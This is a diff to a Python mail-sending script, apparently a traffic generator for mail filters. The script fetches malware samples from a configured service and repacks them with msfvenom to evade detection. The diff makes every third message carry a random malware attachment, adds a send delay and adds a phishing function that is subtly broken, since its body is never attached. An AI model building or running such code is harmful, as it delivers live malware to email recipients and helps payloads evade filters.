@@ -5,6 +5,7 @@ from pathlib import Path
 import random
 import requests
 import smtplib
+import time
 from os.path import basename
 from email import encoders
 from email.mime.base import MIMEBase
@@ -50,6 +51,7 @@ tg_domain = str(config['Domains']['tg_domain'])
 tg_api_key = str(config['Paths and Files']['tg_api_key'])
 malware_count = int(config['Integers']['malware_count'])
 msg_limit = int(config['Integers']['msg_limit'])
+delay = int(config['Integers']['delay'])
 
 def replaced(mode, sequence, old, new):
     if mode == 'startswith':
@@ -109,7 +111,7 @@ def malware_refresh(tg_api_key, tg_domain, malware_count):
 
         filename = list_to_string(filenames)
 
-        os.rename(filename, filename + '.exe')
+        os.rename(filename, filename + ".exe")
         print('Repacking File: ' + filename)
         payloadname = get_random_string()
         print('Calling msfvenom with filesname ' + payloadname + '.exe')
@@ -118,8 +120,7 @@ def malware_refresh(tg_api_key, tg_domain, malware_count):
         except Exception as e:
             print('Something went wrong when we asked MSFVenom to repack our malware. Is your install complete?\n' + str(e))
 
-        os.remove(payloadname + '.exe')
-        os.remove(sampleid_value_zip)
+        os.remove(malware_folder + '/' + payloadname + '.exe')
 
 
 def send_malware(sender, msg_recipient, subject, malware, receiving_mta):
@@ -145,6 +146,16 @@ def send_malware(sender, msg_recipient, subject, malware, receiving_mta):
      with smtplib.SMTP(receiving_mta) as server:
          server.sendmail(sender, msg_recipient, text)
 
+
+def send_phish(sender, msg_recipient, subject, phish, receiving_mta):
+     message = MIMEMultipart()
+     message["From"] = sender
+     message["To"] = msg_recipient
+     message["Subject"] = subject
+     body = phish
+     text = message.as_string()
+     with smtplib.SMTP(receiving_mta) as server:
+         server.sendmail(sender, msg_recipient, text)
 
 def fire(msg_limit):
     msg_count = 1
@@ -185,17 +196,24 @@ def fire(msg_limit):
                 msg = msg.encode('UTF-8')
                 smtpObj = smtplib.SMTP(receiving_mta)
                 try:
-                    if not (msg_count % 3 == 0):
-                        print('Sending message ' + str(msg_count) + ' of ' + str(msg_limit))
-                        with smtplib.SMTP(receiving_mta) as server:
-                            server.sendmail(sender, msg_recipient, msg)
-                    elif (msg_count % 3 == 0):
+                    if (msg_count % 3 == 0):
                         malware = random.choice(os.listdir(malware_folder + '/'))
                         print('Sending message ' + str(msg_count) + ' of ' + str(msg_limit) + ' (Attaching malware file ' + malware + ')')
                         send_malware(sender, msg_recipient, subject, malware_folder + '/' + malware, receiving_mta)
+                    else:
+                        print('Sending message ' + str(msg_count) + ' of ' + str(msg_limit))
+                        with smtplib.SMTP(receiving_mta) as server:
+                            server.sendmail(sender, msg_recipient, msg)
+                    #else:
+                    #    print('Sending message ' + str(msg_count) + ' of ' + str(msg_limit))
+                    #    with smtplib.SMTP(receiving_mta) as server:
+                    #        server.sendmail(sender, msg_recipient, msg)
+                
                 except Exception as e:
                     print('Failed: ' + str(e))
                 msg_count = msg_count + 1
+                if delay > 0:
+                    time.sleep(delay)
                 if msg_count == msg_limit:
                     print('Messages sent: ' + str(msg_count) + '\nFailed: ' + str(failed_count))
                     sys.exit()
